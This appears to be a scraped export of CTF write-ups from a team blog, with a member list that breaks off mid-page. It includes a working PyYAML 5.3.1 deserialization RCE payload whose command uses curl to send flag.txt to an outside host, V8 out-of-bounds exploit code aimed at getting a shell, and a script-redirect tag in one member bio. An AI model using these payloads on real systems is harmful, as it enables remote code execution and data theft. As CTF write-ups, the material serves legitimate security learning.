https://github.com/yaml/pyyaml/blob/5.3.1/lib3/yaml/constructor.py\nThe differences of FullConstructor and UnsafeConstructor is, UnsafeConstructor can uses the yaml tag: python/object/apply (that can be used to call functions) and it doesn't block some reserved keywords.\nFrom there, we guessed the challenge was to do an RCE using python/object/new tag (that is available in FullConstructor) and somehow bypass the CVE-2020-1747 fixes. (With the POC here)\nThe CVE-2020-1747 exploits the fact that user can input a object with a customized extend function, so that after the object is constructed (with python/object/new / python/object/apply), it can trigger the function extend as it is used by the constructor as below:\ndef construct_python_object_apply(self, suffix, node, newobj=False): ... instance = self.make_python_instance(suffix, node, args, kwds, newobj) if state: self.set_python_instance_state(instance, state) if listitems: instance.extend(listitems) if dictitems: for key in dictitems: instance[key] = dictitems[key] return instance While the format of python/object/apply can supply states for the object, we can use python/name to reference a python internal function (exec, eval etc). We cannot use an module function as . and _ is blocked, so the CVE PoC cannot be used. (and it used apply, which is blocked by FullConstructor)\n# !!python/object/apply # (or !!python/object/new) # args: [ ... arguments ... ] # kwds: { ... keywords ... } # state: ... state ... # listitems: [ ... listitems ... ] # dictitems: { ... dictitems ... } # or short format: # !!python/object/apply [ ... arguments ... ] The 5.3.1 fixes also blocked the key extend and ^__.*__$ to disallow setting those key with the state parameter.\nWe discovered that we can use python/object/new with type constructor (type is a type...) to create new types with some customized internal state. With this, we can bypass the state key block mechanism and freely set our object to something like this:\n!!python/object/new:type args: [\u0026#34;z\u0026#34;, !!python/tuple [], {\u0026#34;extend\u0026#34;: !!python/name:exec }] With this we can put our commands to listitems, and the constructor will call instance.extend(listitems), thus finish our RCE exploit.\nFull payload:\n!!python/object/new:type args: [\u0026#34;z\u0026#34;, !!python/tuple [], {\u0026#34;extend\u0026#34;: !!python/name:exec }] listitems: \u0026#34;\\x5f\\x5fimport\\x5f\\x5f(\u0026#39;os\u0026#39;)\\x2esystem(\u0026#39;curl -POST mil1\\x2eml/jm9 -F x=@flag\\x2etxt\u0026#39;)\u0026#34; (We changed _ to \\x5f and . to \\x2e to bypass the regex limitation)\nThe intended solution uses map as a type (as it is a type in Python 3):\n!!python/object/new:tuple [!!python/object/new:map [!!python/name:eval , [ \u0026#39;PAYLOAD_HERE\u0026#39; ]]] This is essentially the python code tuple(map(eval, \u0026quot;PAYLOAD\u0026quot;))), and this works as map and tuple are both class constructor (so it doesnt use any function as apply calls).\nThanks for the author for such cool challenge (basically used a 0day for the CTF challenge).\n","permalink":"https://b6a.black/posts/2020-07-22-uiuctf-deserializeme/","summary":"Update: It was assigned as CVE-2020-14343 after the contest.\n This was a fun challenge exploiting a deserialize service in Python.\nThe server is using pyYAML and Flask, with the source code below:\nfrom flask import Flask, session, request, make_response import yaml import re import os app = Flask(__name__) app.secret_key = os.urandom(16) @app.route(\u0026#39;/\u0026#39;, methods=[\u0026#34;POST\u0026#34;]) def pwnme(): if not re.fullmatch(b\u0026#34;^[\\n --/-\\]a-}]*$\u0026#34;, request.data, flags=re.MULTILINE): return \u0026#34;Nice try!\u0026#34;, 400 return yaml.load(request.data) if __name__ == \u0026#39;__main__\u0026#39;: app.","title":"UIUCTF 2020: deserializeme"},{"content":"Challenge Summary  Tom Nook is testing a new encryption scheme for nookphones, but it seems to be a bit faulty... can you break it?\n nookcrypt is a netcat service that have no source code released. There are two functions exposed:\n Gets an encrypted copy of the flag (and the message hello world). Encrypts an arbitrary message.  For example, this is what I had when trying out the options:\nOption: 1 enc(FLAG) = (0xf31ce7cb1f2c6e7107318d76bdda50c5, 0x02d979fc3122bbaffcc1111953bc184f) enc(\u0026#39;hello world\u0026#39;) = (0x4cf5afcc9bc1db0118172129b713d86a, 0xe41d8761370768aa9694b164c843dde9) Option: 2 msg: hello world enc(0x68656c6c6f20776f726c64) = (0x4cf5afcc9bc1db0118172129b713d86a, 0xe41d8761370768aa9694b164c843dde9) Since the response is consistent after reconnecting to the netcat service for multiple times, I assume that the parameters are constant.\nSolution Part I: Recovering the curve parameters in a stupid way Since it is mentioning elliptic curves in its services, the first thing I was doing is to recover the parameters, namely, $a$, $b$ and $p$ for the elliptic curve $y^2 \\equiv x^3 + ax + b\\ (\\text{mod}\\ p)$.\nMy attempt is to encrypt a bunch of messages:\nmsg: a enc(0x61) = (0xb2d6c27a99b52aec6e243d4e4f67cb71, 0x9dfa2bd87ea1e09388493137132cc534) msg: b enc(0x62) = (0x99b8150ebf23c69ee1056f0e329496ae, 0xe1febe35a5877f00f3876c2a24fb9164) msg: c enc(0x63) = (0x3e7ef6d1106382119a0fa8c966f6d1df, 0x89d81b9fab5336a227414491881bbee8) msg: d enc(0x64) = (0x985dbb38a65f4e69bfc602d7e114cad9, 0xcad1cb62a3d30b05093575f3a22f7e3c) ... Define $C_i = (x_i, y_i)$ be the ciphertexts of some message $m_i$. By direct substitution, we have $y_i^2 \\equiv x_i^3 + ax_i + b\\ (\\text{mod}\\ p)$ for all $i$.\nAssume that we have three ciphertexts. We can deduce that:\n $a(x_1 - x_2) \\equiv y_1^2 - y_2^2 - x_1^3 + x_2^3 \\ (\\text{mod}\\ p)$ and $a(x_2 - x_3) \\equiv y_2^2 - y_3^2 - x_2^3 + x_3^3 \\ (\\text{mod}\\ p)$.  From above, we know $(y_1^2 - y_2^2 - x_1^3 + x_2^3)(x_2 - x_3) - (y_2^2 - y_3^2 - x_2^3 + x_3^3)(x_1 - x_2)$ is a multiple of $p$.\nSo we have collected a bunch of \u0026quot;multiples of $p$\u0026quot; and take their gcd. We have recovered that $p = 340282366762482138434845932244680310783$.\nThen it is rather obvious to recover $a = 284470887156368047300405921324061011681$ and $b = 126188322377389722996253562430093625949$.\nQuestion. What if it is not defined on a prime field? Well\u0026hellip; I didn\u0026rsquo;t think of that. But who cares? I could probably observe this if my approach doesn\u0026rsquo;t work out.  Part II: A reflection on the \u0026quot;after-math\u0026quot; Note. I did not think of this during the game. Stupid me.  Knowing that the ciphertext $C$ is a multiple of the message $m$, i.e., $C = mG$, we can simply encrypt $m = 1$:\n[+] Opening connection to chal.uiuc.tf on port 2006: Done [DEBUG] Received 0x123 bytes: b\u0026#39;\\n\u0026#39; b\u0026#39;========================================\\n\u0026#39; b\u0026#39;Welcome to NookCrypt! Here we use fancy\\n\u0026#39; b\u0026#39;elliptic curve encryption to keep your \\n\u0026#39; b\u0026#39;messages safe! Try it out!\\n\u0026#39; b\u0026#39;========================================\\n\u0026#39; b\u0026#39;1. get (encrypted) flag\\n\u0026#39; b\u0026#39;2. encrypt message\\n\u0026#39; b\u0026#39;3. quit\\n\u0026#39; b\u0026#39;========================================\\n\u0026#39; b\u0026#39;\\n\u0026#39; b\u0026#39;Option: \u0026#39; [DEBUG] Sent 0x2 bytes: b\u0026#39;2\\n\u0026#39; [DEBUG] Received 0x5 bytes: b\u0026#39;msg: \u0026#39; [DEBUG] Sent 0x2 bytes: 00000000 01 0a │··│ 00000002 [DEBUG] Received 0x178 bytes: b\u0026#39;enc(0x01) = (0x7b6aa5d85e572983e6fb32a7cdebc140, 0x27b6916a894d3aee7106fe805fc34b44)\\n\u0026#39; b\u0026#39;\\n\u0026#39; b\u0026#39;========================================\\n\u0026#39; b\u0026#39;Welcome to NookCrypt! Here we use fancy\\n\u0026#39; b\u0026#39;elliptic curve encryption to keep your \\n\u0026#39; b\u0026#39;messages safe! Try it out!\\n\u0026#39; b\u0026#39;========================================\\n\u0026#39; b\u0026#39;1. get (encrypted) flag\\n\u0026#39; b\u0026#39;2. encrypt message\\n\u0026#39; b\u0026#39;3. quit\\n\u0026#39; b\u0026#39;========================================\\n\u0026#39; b\u0026#39;\\n\u0026#39; b\u0026#39;Option: \u0026#39; What can we do? Since this is $G$, we can simply search this on Google:\n Ta-da :tada: - it is the generator for curve secp128r2. You would think this is a ta-da moment, I would say that this is a facepalm moment. I could spent much less time on recovering the parameters in such a way.\nWell, I was even more confused to notice that is a secure curve. I personally don't have a backdoor of secp128r2 (I am much appreciated if you tell me if you do) and thought the challenge isn't doable.\nPart III: \u0026quot;Hint for nookcrypt (crypto 500)\u0026quot; Fours hours later the organizers released a hint in the Discord server:\n When I was being played writing an interactor with the service, I observed that there was a strange behaviour regarding to the flag encryption method:\n======================================== Welcome to NookCrypt! Here we use fancy elliptic curve encryption to keep your messages safe! Try it out! ======================================== 1. get (encrypted) flag 2. encrypt message 3. quit ======================================== Option: 1 err Oh. So the error was caused by the cosmic ray. Okay.\nDid you really get it instantly when the hint is announced? No.  Part IV: Somebody made a breakthrough Ten hours later, somebody from Discord claimed that he has a strange observation:\n Who was the somebody? Me.  We made a bunch of assumptions. Cutting the crap, we assumed that the same generator $G = (x_G, y_G)$ is being multipled in a same way, except that the curve is operated on new modulo $p'$. This matches the author's statement regarding on the prime being corrupted.\nHowever, obviously, it is very likely that $G$ may not be a point the above curve. Luckily (or unluckily), we can assume that it is operating on another curve $y^2 \\equiv x^3 + ax + b'\\ (\\text{mod}\\ p')$, such that $G$ is on it.\nFor now, we are given two points on this curve (the ciphertexts of the flag $F = (x_F, y_F)$ and the message hello world $M = (x_M, y_M)$). Since $a$ is known we can easily recover $p'$ by:\n\\[\\begin{aligned} p' = \\text{gcd}( \u0026(y_F^2 - x_F^3 - ax_F - b') - (y_G^2 - x_G^3 - ax_G - b'), \\\\ \u0026 (y_M^2 - x_M^3 - ax_M - b') - (y_G^2 - x_G^3 - ax_G - b')) \\end{aligned} \\]\nThe order of the generator should be a large prime for an elliptic curve to be secure. Clearly this property may not hold on those new modulos struck by cosmic may. For instance, suppose that we have $p' = 340282366762482138434845932242512471141$. Since 67 is a factor of $p'$, we are indeed working on the curve $y^2 \\equiv x^3 + ax + b'\\ (\\text{mod}\\ 67)$. $G$ has a order 74, and $F = fG = 21G$. It implies that $f \\equiv 21\\ (\\text{mod}\\ 74)$.\nBy collecting a bunch of linear congruences, we can find $f$ by the Chinese Remainder Theorem. Eventually we have the flag: uiuctf{th4t_5ur3_w4s_f4ulty_huh?}.\n","permalink":"https://b6a.black/posts/2020-07-22-uiuctf-nookcrypt/","summary":"Challenge Summary  Tom Nook is testing a new encryption scheme for nookphones, but it seems to be a bit faulty... can you break it?\n nookcrypt is a netcat service that have no source code released. There are two functions exposed:\n Gets an encrypted copy of the flag (and the message hello world). Encrypts an arbitrary message.  For example, this is what I had when trying out the options:","title":"UIUCTF 2020: nookcrypt"},{"content":"Chromatic Aberration Points: 182 Solves: 20 Pwn our chrome for fun and profit. Ok, it\u0026#39;s not really Chrome, but it\u0026#39;s close enough. Let\u0026#39;s say, it\u0026#39;s chromatic The memory limit is 64MB nc chromatic-aberration.zajebistyc.tf 31004 6d87044f837a59e649f6d799143aede299a3103e764f8c46c921c3ee16da773a_chromatic_aberration.tar 103M For people having problems with the above link, try this ones 6d87044f837a59e649f6d799143aede299a3103e764f8c46c921c3ee16da773a_chromatic_aberration.tar 103M 6d87044f837a59e649f6d799143aede299a3103e764f8c46c921c3ee16da773a_chromatic_aberration.tar 103M In this CTF Question, author introduced a OOB read and arbitary write to the Array.fill of the V8 engine. So, our exploitation will be very straightforward. First, we will set up an array of BitInts with 0x33313131 as marking for arbitary write after we collect sufficient primitive with the OOB.\nvar tarr = new BigUint64Array(8); tarr[0] = 0x33313131n; tarr[1] = 0x32323232n; Then, we will setup an array of ArrayBuffer and trigger garbage collection to move all of this items to the oldspace. As mentioned in the doc of GC, its expected to trigger in anytime, this step can ensure the address leaked will be constant throughout the exploitation. This is essential for locating relative information and escalate to code execution (there is a better way for this chall though).\nvar ab = [] for (var i = 0; i \u0026lt; 0x200; i++) { ab.push(new ArrayBuffer(0x1337)); } var oob_str_arr = [\u0026#39;AAAAAAAA\u0026#39;,\u0026#39;BBBBBBBB\u0026#39;,\u0026#39;CCCCCCCC\u0026#39;] gc(); gc(); console.log(\u0026#39;[+] Locate relative postion of tarr\u0026#39;) We use the OOB read primitive to locate the relative position of tarr from oob_str_arr and locate one of the ArrayBuffers:\nvar tarr_ix = 0; for (var i = 0; i \u0026lt; 4000; i++) { if (oob_str_arr[0].charCodeAt(-1620000-i) == 0x33 \u0026amp; oob_str_arr[0].charCodeAt(-1620000-i-1) == 0x31 \u0026amp; oob_str_arr[0].charCodeAt(-1620000-i-2) == 0x31 \u0026amp; oob_str_arr[0].charCodeAt(-1620000-i-3) == 0x31) { tarr_ix=i; } } console.log(tarr_ix); console.log(\u0026#39;[+] Locate array buffer\u0026#39;) var ab_ix = 0; for (var i = 0; i \u0026lt; 4000; i++) { if (oob_str_arr[0].charCodeAt(-1620000-i) == 0x13 \u0026amp; oob_str_arr[0].charCodeAt(-1620000-i-1) == 0x37) { ab_ix=i; } } The above code used the memory layout as a feature for locating the ArrayBuffer from the memory:\nOriginally, we fetch the difference dynamically, but it turns out that this way not quite stable, so we just hardcode it with 650 (found base on experiment).\n// 650 is the threshold calculate from running the code in debugger // weird diff = 650 // tarr_ix-ab_ix; console.log(\u0026#39;[+] Difference : \u0026#39;) console.log(diff) Next, we will corrupt the size of the ArrayBuffer we obtained and get it back:\ntarr.fill(0x4000n,Math.floor(diff/8)-1,Math.floor(diff/8)); var corrupted_ix = 0; console.log(\u0026#39;[+] Now we corrupted one of the array size :)\u0026#39;) for (var i = 0; i \u0026lt; 0x200; i++) { if (ab[i].byteLength!=0x1337) { corrupted_ix =i; } } Our exploitation technique is simple, we will corrupt the backing store of the ArrayBuffer and point it to anywhere in the memory.\nHowever, from the deployed pointer compression12, we cannot leak address directly. We will need to leak the upper part of the address instead. While scanning the memory, we found the upper part of the address:\nThe 0x0000007 pattern exist constantly throughout runtime, so we use the below code to scan the memory in order to retrieve the upper part of the address:\nvar up_byte = 0; var lo_byte = 0; for (var i = 0; i \u0026lt; 10000; i++) { if (oob_str_arr[0].charCodeAt(-1620000-i) ==0 \u0026amp; oob_str_arr[0].charCodeAt(-1620000-i-1)==0 \u0026amp; oob_str_arr[0].charCodeAt(-1620000-i-2)==0 \u0026amp; oob_str_arr[0].charCodeAt(-1620000-i-3)==7 \u0026amp; oob_str_arr[0].charCodeAt(-1620000-i+1)\u0026gt;0 \u0026amp; oob_str_arr[0].charCodeAt(-1620000-i+2)\u0026gt;0) { up_byte = oob_str_arr[0].charCodeAt(-1620000-i+2); lo_byte = oob_str_arr[0].charCodeAt(-1620000-i+1); break; } } Thanks to the pointer compression, the step for leaking the binary base is much easier now. We can leak some pointer of d8. Then, using the CXA handler to resolve the GI abort and overwrite the free hook with system and call console.log('sh') to get the shell. I exploit with pwn_with_logs.js will crash due to weird GC issues.\n  A Eulogy for Patch-gapping Chrome\u0026#160;\u0026#x21a9;\u0026#xfe0e;\n Compressed pointers in V8\u0026#160;\u0026#x21a9;\u0026#xfe0e;\n   ","permalink":"https://b6a.black/posts/2020-07-01-confidencectf-teaser-chromatic/","summary":"In this CTF Question, author introduced a OOB read and arbitary write to the Array.fill of the V8 engine. So, our exploitation will be very straightforward. First, we will set up an array of BitInts with 0x33313131 as marking for arbitary write after we collect sufficient primitive with the OOB.","title":"CONFidence 2020 Teaser CTF: Chromatic Aberration"},{"content":"Pass the Hash (Warmup/Learning; 50 points) Solved by Mystiz.\nChallenge Summary We are given a peculiar hash algorithm that generates 64-byte long hashes, which wraps of sha0, sha1, sha256 and ripemd160. The hash takes two arguments, salt (20 bytes) and password (22 bytes). We are allowed to control the salt, whilst the goal is to find the password within 1024 queries.\nHash construction We are given a peculiar hash algorithm that generates 64-byte long hashes, which wraps of sha0, sha1, sha256 and ripemd160.\nThe hash is defined by:\n $L_0, R_0 = \\text{password}\\ |\\ \\text{salt}\\ |\\ \\text{password}$ ($L_0, R_0$ separate the 64-byte block) $L_{i+1} = L_i \\oplus h_R(R_i), R_{i+1} = R_i \\oplus h_L(L_i)$, for $i = 0, 1, ..., 15$.  Here $h_L$ and $h_R$ are the two hash algorithms that uses one of the commonly used hash algorithms based on the content. As this is a 32-byte block, if the hash algorithm itself does not consist 32 bytes, it would repeat itself until there are 32 bytes.\nSolution Part I: Repeat, repeat, repeat One question that had brought up to my mind is: What if the $h_L$ and $h_R$ uses solely the 20-byte hash algorithms (i.e., all but sha256)?  Assume that 20-byte hash algorithms are used. Let's see what will happen in a round.\nDefine $s_0\\ |\\ s_1\\ |\\ ...\\ |\\ s_9 := L_i\\ | \\ R_i$ and $t_0\\ |\\ t_1\\ |\\ ...\\ |\\ t_9 := L_{i+1}\\ | \\ R_{i+1}$, where:\n $s_0, s_2, s_3, s_6, s_7, s_9, t_0, t_2, t_3, t_6, t_7, t_9$ are 8 bytes long, and $s_1, s_4, s_5, s_8, t_1, t_4, t_5, t_8$ are 4 bytes long.  Then we have:\n $t_0\\ |\\ t_1\\ |\\ ...\\ |\\ t_4 = s_0\\ |\\ s_1\\ |\\ ...\\ |\\ s_4\\ |\\ h_R(s_5\\ |\\ s_6\\ |\\ ...\\ |\\ s_9)$, and $t_5\\ |\\ t_6\\ |\\ ...\\ |\\ t_9 = s_5\\ |\\ s_6\\ |\\ ...\\ |\\ s_9\\ |\\ h_L(s_0\\ |\\ s_1\\ |\\ ...\\ |\\ s_4)$.  However, since the first and last 12 bytes of $h_R(\\cdot)$ are equal, we have\n $s_0 \\oplus t_0 = s_3 \\oplus t_3$, and $s_1 \\oplus t_1 = s_4 \\oplus t_4$.  The assumption applies on $h_L(\\cdot)$ as well. Thus we have\n$s_5 \\oplus t_5 = s_8 \\oplus t_8$, and $s_6 \\oplus t_6 = s_9 \\oplus t_9$.  If we define $L_0, R_0$ by $a_0, a_1, \u0026hellip;, a_9$ and $L_{16}, R_{16}$ by $b_0, b_1, \u0026hellip;, b_9$ (their lengths are respectively equal to $s_0, s_1, \u0026hellip;, s_9$), we still have the below properties:\n $b_0 \\oplus b_3 = a_0 \\oplus a_3$, $b_1 \\oplus b_4 = a_1 \\oplus a_4$, $b_5 \\oplus b_8 = a_5 \\oplus a_8$, and $b_6 \\oplus b_9 = a_6 \\oplus a_9$.   Part II: What does it mean? Let's look back how $L_0, R_0$ is defined - $\\text{password}\\ |\\ \\text{salt}\\ |\\ \\text{password}$. This gives us two more properties:\n$a_0 = a_7, a_1 = a_8, a_2 = a_9$ (derived from passwords), and we can control the values of $a_3, a_4, a_5, a_6$.  So... assuming that $h_L$ and $h_R$ uses solely the 20-byte hash algorithms, we can effectively find the password (namely $a_0, a_1, a_2$):\n $a_0 = a_3 \\oplus b_0 \\oplus b_3$, $a_1 = a_4 \\oplus b_1 \\oplus b_4$ and $a_2 = a_9 = a_6 \\oplus b_6 \\oplus b_9$.  Part III: But the assumption is too good to be true! As stated from the title, the assumption is quite hard to satisfy. What we need is, in each of the 16 rounds, $h_L$ and $h_R$ needs to pick an 20-byte hash algorithm instead of the 32-byte hash algorithm... Very difficult isn't it?\nThe answer is not really. The probability to use 20-byte hash algorithms all along is $0.75^{32}\\approx 0.000145257$, which is approximately one out of 10000. We can visit the oracle 10 times, in average, to compute the password from the hash algorithm.\nIt is very easy to know when we had the hash algorithm. From properties 2 and 3, we have:\n\\[b_1 \\oplus b_4 \\oplus b_5 \\oplus b_8 = a_1 \\oplus a_4 \\oplus a_5 \\oplus a_8 = a_4 \\oplus a_5.\\]\nWriting the exploit script solving the challenge, we have the flag: PTBCTF{420199e572e685af8e1782fde58fd0e9}.\nAvec? (Cryptanalysis; 856 points) Solved by harrier.\nChallenge Summary This is a interesting question where we are given a ciphertext, encrypted using AES-GCM, with key and nonce generated by polish_key(os.urandom(8)) and concat itself. The key and nonce is not provided though, so we have to somehow reverse the polish_key process to know more about the key and nonce.\nSolution I first thought this is a GCM nonce collision problem, but the 12 bytes nonce and nonce generation rejects this thought.\nThe polish_key function is the following:\ndef polish_key(key): key = bytes_to_long(key[::-1]) key = GF(2**64).fetch_int(key) key = key ** 0xbcafffff435 key = long_to_bytes( key.integer_representation() )[::-1] assert len(key) == 8 return key Which 0xbcafffff435 is can be factored into $3\\times5\\times7\\times257\\times3019\\times65537$. Knowing that $3^{32} - 1 = 3\\times5\\times7\\times257\\times65537$, the key is of order $3^{32}+1$ (or a factor of it). Hence, the entropy for key and nonce are 32 bits. Exhausting both of them at the same time requires $2^{64}$ trials... or really?\nBecause the cipher is under GCM and with a known AAD, given a key $k$ and a ciphertext $c$, we can compute $\\text{GHASH}_{k,c}(\\text{AAD})$.\nConsider the GCM mode with its tag generation. The tag generation is given by $\\text{tag} = E_k(\\text{nonce}) \\oplus \\text{GHASH}_{k,c}(\\text{AAD})$. Therefore, with known key $k$, one can find out the key-correspondent nonce by $\\text{nonce} = D_k(\\text{tag} \\oplus \\text{GHASH}_{k,c}(\\text{AAD}))$.\nTherefore we can exhaust the key $k$ with $2^{32} + 1$ trials, for each key $k$ find its corresponding $nonce$ and see whether it is the correct one.\nWe can even make it quickly by identifying the $\\text{nonce}$ should end with \\x00\\x00\\x00\\x01 with this method, as it is using a 12-byte nonce.\nWe initially use Sage to deal with the challenge, but it was way too slow (to generate the possible keys) and decided to use Python instead. But we don't want to use other language other than Sage to generate the keys...\nSo what we have done is a simple multi-thread Sage key generator and a Python solver. And it was wayyyyyyyyyyyy too slow... even with pypy.\nBoth the key generator and the pypy solver are terribly slow. I cannot find a simple GHASH implementation to do the brute-forcing part. Computing $2^{16}$ keys takes me more than 3 mins in pypy... I just wanted to use something fast to test through the keys. BearSSL saids it can process \u0026gt;1000MBps according to its benchmark. Maybe I should use a language with fast compiled code.\nI am a Rustacean, so why not to do it in Rust? The result is blazingly fast. It could be solved within an hour with a 64-core computer (from one of my teammates). Sage was then the bottleneck, and thus I did not bother to improve the performance of the Rust solver.\nI should use Rust to generate keys to speedup the whole thing, but anyway, we solved it! :)\nWrong Ring (Cryptanalysis; 936 points) Solved by Mystiz.\nChallenge Summary I personally see this is a cumbersome math. One of my teammates pointed out that this is similar to a ring-LWE. But anyway, knowing that is a ring-LWE does not help much.\nOkay, let's get back on track. A secret polynomial, $S$, is generated to derive the key. We are given eight polynomial pairs of $(A_k, B_k)$ such that $B_k(x) \\equiv A_k(x)S(x) + \\varepsilon_k(x)\\ (\\text{mod}\\ p(x))$, where $\\varepsilon_k$ is an error polynomial and $p(x) = x^{256} + 1486$.\nSolution Part I: Complicating the problem a bit Let's make the polynomial concrete! Define:\n\\[A_k(x) = \\sum_{i=0}^{255} a_{ki} x^i, B_k(x) = \\sum_{i=0}^{255} b_{ki} x^i, \\varepsilon_k(x) = \\sum_{i=0}^{255} e_{ki} x^i, S(x) = \\sum_{i=0}^{255} s_i x^i.\\]\n$a_{ki}, b_{ki}, s_i$ are all integers in the set $[0, 1486]$, while $e_{ki}$ are small real numbers.\nThen we have\n\\[\\begin{aligned} \\sum_{i=0}^{255} b_{ki} x^i \u0026\\equiv \\left(\\sum_{i=0}^{255} a_{ki} x^i\\right)\\left(\\sum_{i=0}^{255} s_i x^i\\right) + \\sum_{i=0}^{255} e_i x^i \\\\ \u0026\\equiv \\sum_{i=0}^{510}\\left(\\sum_{j=\\text{max}(0,i-255)}^{\\text{min}(255,i)} a_{kj}s_{i-j}\\right)x^i + \\sum_{i=0}^{255} e_i x^i \\\\ \u0026\\equiv \\sum_{i=0}^{255}\\left(\\sum_{j=\\text{max}(0,i-255)}^{\\text{min}(255,i)} a_{kj}s_{i-j}\\right)x^i + \\sum_{i=256}^{510}\\left(\\sum_{j=\\text{max}(0,i-255)}^{\\text{min}(255,i)} a_{kj}s_{i-j}\\right)x^i + \\sum_{i=0}^{255} e_i x^i \\\\ \u0026\\equiv \\sum_{i=0}^{255}\\left(\\sum_{j=0}^i a_{kj}s_{i-j}\\right)x^i + \\sum_{i=256}^{510}\\left(\\sum_{j=i-255}^{255} a_{kj}s_{i-j}\\right)x^i + \\sum_{i=0}^{255} e_i x^i \\\\ \u0026\\equiv \\sum_{i=0}^{255}\\left(\\sum_{j=0}^i a_{kj}s_{i-j}\\right)x^i - 1486\\sum_{i=256}^{510}\\left(\\sum_{j=i-255}^{255} a_{kj}s_{i-j}\\right)x^{i-256} + \\sum_{i=0}^{255} e_i x^i \\\\ \u0026\\equiv \\sum_{i=0}^{255}\\left(\\sum_{j=0}^i a_{kj}s_{i-j}\\right)x^i - 1486\\sum_{i=0}^{254}\\left(\\sum_{j=i+1}^{255} a_{kj}s_{i-j+256}\\right)x^{i} + \\sum_{i=0}^{255} e_i x^i \\\\ \u0026\\equiv \\sum_{i=0}^{255}\\left(\\sum_{j=0}^i a_{kj}s_{i-j} - 1486 \\sum_{j=i+1}^{255} a_{kj}s_{i-j+256} + e_i\\right)x^i \\\\ \u0026\\equiv \\sum_{i=0}^{255}\\left(\\sum_{j=0}^i a_{k,{i-j}}s_j - 1486 \\sum_{j=i+1}^{255} a_{k,i-j+256}s_j + e_i\\right)x^i \\end{aligned}\\]\nExplanations: Under modulo $p(x)$, $x^{256} = -1486$ - so we have $$\\sum_{i=256}^{510}\\left(\\sum_{j=i-255}^{255} a_{kj}s_{i-j}\\right)x^i = - 1486\\sum_{i=256}^{510}\\left(\\sum_{j=i-255}^{255} a_{kj}s_{i-j}\\right)x^{i-256}.$$  Very complicated right? Yes... But we have a conclusion for this part:\nFor each $i = 0, 1, \u0026hellip;, 255$ and $k = 1, 2, \u0026hellip;, 8$, we have: $$b_{ki} = \\sum_{j=0}^i a_{k,{i-j}}s_j - 1486 \\sum_{j=i+1}^{255} a_{k,i-j+256}s_j + e_i.$$  Part II: An insight I have noticed that the coefficients for $x^{240}, x^{241}, ..., x^{255}$ in the error polynomial would be very small (less than 0.1 in magnitude). So why don't we compare the coefficients directly?\nFor each $i = 240, 241, ..., 255$ and $k = 1, 2, ..., 8$, we have a corresponding equation:\n\\[\\text{round}(b_{ki}) = \\sum_{j=0}^i a_{k,{i-j}}s_j - 1486 \\sum_{j=i+1}^{255} a_{k,i-j+256}s_j.\\]\nSince there are 256 unknowns ($s_0, s_1, ..., s_{255}$) and 256 equations, we can hopefully solve the equation. This gives us the key, hence the flag.\nLOTR (Cryptanalysis; 936 points) Solved by Mystiz.\nChallenge Summary This is an attempt to implement an anonymous signature scheme using RSA. In short, given $m$ parties with public keys being $n_1, n_2, ..., n_m$, the signature generated by this group is defined by $(c_1, c_2, ..., c_m)$, where\n\\[\\sum_{k=1}^m \\text{RSAEncrypt}(c_k, n_k)\\equiv\\text{hash}\\ (\\text{mod}\\ 2^{256}),\\]\nand $2^{2175} + 2^{2048} \\leq c_k \\leq 2^{2176} - 2^{2048}$ for each of the $k$'s.\nThere is a catch: if $c = qn + r$ with $0 \\leq r \u0026lt; q$, $\\text{RSAEncrypt}(c, n) = qn + [r^e\\ (\\text{mod}\\ n)]$.\nSolution Part I: Simplify the challenge as much as possible $\\text{RSAEncrypt}(qn + r, n) = qn + [r^e\\ (\\text{mod}\\ n)]$ is cumbersome. Why don't we just assume $r = 0$ so that $\\text{RSAEncrypt}$ is just an identity function?\nPart II: The main dish Note: The $c_k$ and $c_k'$ defined below are multiples of $n_k$. This is what we had from the above part for the simplicity\u0026rsquo;s sake.  My approach is to generate two ciphertexts, namely, $c_k$ and $c_k'$ for the $k$-th party. In this way, we have 243 ciphertext pairs. We are looking for $x_1, x_2, ..., x_{243}\\in{0, 1}$ such that\n\\[\\bigoplus_{k=1}^m [(1 - x_k) \\text{RSAEncrypt}(c_k, n_k) + x_k \\text{RSAEncrypt}(c_k', n_k)] \\equiv \\text{hash}\\ (\\text{mod}\\ 2^{256}).\\]\nSimplifying, we have:\n\\[\\bigoplus_{k=1}^m [x_k (c_k - c_k')] \\equiv \\text{hash} \\oplus \\bigoplus_{k=1}^m c_k\\ (\\text{mod}\\ 2^{256}).\\]\nIdea: My approach is to check if one of the $2^{243}$ possible generated ciphertexts covers the target hash. If not, generate another set.  The above equation is just an linear equation! Solving it we had the values of $x_k$'s. If $x_k = 0$ we pick $c_k$, and $c_k'$ otherwise. After all we have forged a signature.\nPrimitive Obsession (Reverse Engineering; 936 points) Solved by Mystiz.\nChallenge Summary This is a crackme with a 260-byte long input. Conditions involves basic math operations after casting some of the bytes into various types.\nSolution My first thought is to use Angr! Unfortunately I am not a good Angr user - so it took me a long while to give up. I have finally adopted an ultra-naive approach...\n That is, I have extracted the expressions one by one manually and pass them to z3. After all, I admit my stupidity - it took me six hours to solve it...\n","permalink":"https://b6a.black/posts/2019-10-02-pwnthybytes/","summary":"Pass the Hash (Warmup/Learning; 50 points) Solved by Mystiz.\nChallenge Summary We are given a peculiar hash algorithm that generates 64-byte long hashes, which wraps of sha0, sha1, sha256 and ripemd160. The hash takes two arguments, salt (20 bytes) and password (22 bytes). We are allowed to control the salt, whilst the goal is to find the password within 1024 queries.\nHash construction We are given a peculiar hash algorithm that generates 64-byte long hashes, which wraps of sha0, sha1, sha256 and ripemd160.","title":"PwnThyBytes CTF 2019 Writeup"},{"content":"Black Bauhinia is a Capture-the-Flag team from Hong Kong founded in 2019 and have been actively participating in CTF games since then. You can find us on CTFtime, Twitter, Facebook, YouTube or Patreon (New!). As you can see, this page is still work-in-progress.\nOur members   harrier (Joined Jul 2019)     cire meat pop (Joined Jul 2019)      Mystiz (Joined Jul 2019) I guess therefore I am. Will guess hard for flags.\n     byronwai (Joined Jul 2019) - A bard who put all his AP to ATK      wwkenwong (Joined Jul 2019) - North Korea\u0026#39;s botnet      ozetta (Joined Jul 2019) \u0026lt;script\u0026gt;location=\u0026#39;http://ic.ozetta.net\u0026#39;\u0026lt;/script\u0026gt;\n     Cousin (Joined Dec 2019) - Sponsored by Ken Wong A math guy who loves cryptography, but cryptography doesn\u0026#39;t love back.\n    double (Joined Dec 2019)      crabmony (Joined Mar 2020)    GeoffreyY (Joined Jul 2020)      eriri (Joined Jul 2020)    apple (Joined Jul 2020)      vikychoi (Joined Jul 2020)    M0UZ3 (Joined Sep 2020)      blackphreak (Joined Oct 2020) - An unlicensed front gate security I have a dream that someday I can become a security researcher.\n   Kaiziron (Joined 